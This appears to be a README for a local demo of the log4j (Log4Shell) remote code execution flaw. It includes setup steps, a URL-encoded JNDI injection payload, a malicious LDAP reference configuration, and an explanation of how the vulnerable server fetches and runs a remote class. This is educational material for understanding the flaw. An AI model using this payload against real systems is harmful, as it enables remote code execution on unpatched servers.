# Demo code to see how the log4j security issue works from the remote execution side

- Run `mvm clean compile`. This 
- Run the Spring boot application class FileServerApplication to launch a fileserver which serves the exploitable code.
- Run the LDAPRefServer and pass this argument: "http://127.0.0.1:8888/#Exploit"
- Open a browser and go to this URL: http://localhost:8080/seeforyourself?loggedData=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2FExploit%7D
- On the vulnerable server project, check the logging for the executed code

## How does this work?

The vulnerable server receives a request with a parameter 'loggedData'. This parameter is logged using log4j2. Log4j2 supports automatic lookups using strings, which makes it very easy to use specific properties
or environment variables and evaluate them to concrete values runtime. However this also works for JNDI lookups. Because of that, any log entry which contains a JNDI lookup, will be evaluated.

Let's say the parameter 'loggedData' is a form field on a website and it's input is logged. This makes it possible for an attacker to log a perform a JNDI lookup, for example by injecting the value '${jndi:ldap://127.0.0.1:1389/Exploit}'.
Log4j will perform the lookup which directs to attacker's LDAP server, which sets the returned values.

The malicious LDAPRefServer sets the remote class properties:
https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html

```properties
javaClassName = foo (we don't care about this name)
javaCodebase = http://127.0.0.1:8888/ (this is the argument we pass to the LDAPRefServer on launch)
objectClass = javaNamingReference
javaFactory = Exploit (this is the anchor argument we pass to the LDAPRefServer on launch)
```

The vulnerable server will download the malicious class from http://127.0.0.1:8888/Exploit.class and execute it.

Because of the log4j lookup syntax this exploit is limited to log4j only: https://logging.apache.org/log4j/2.x/manual/lookups.html

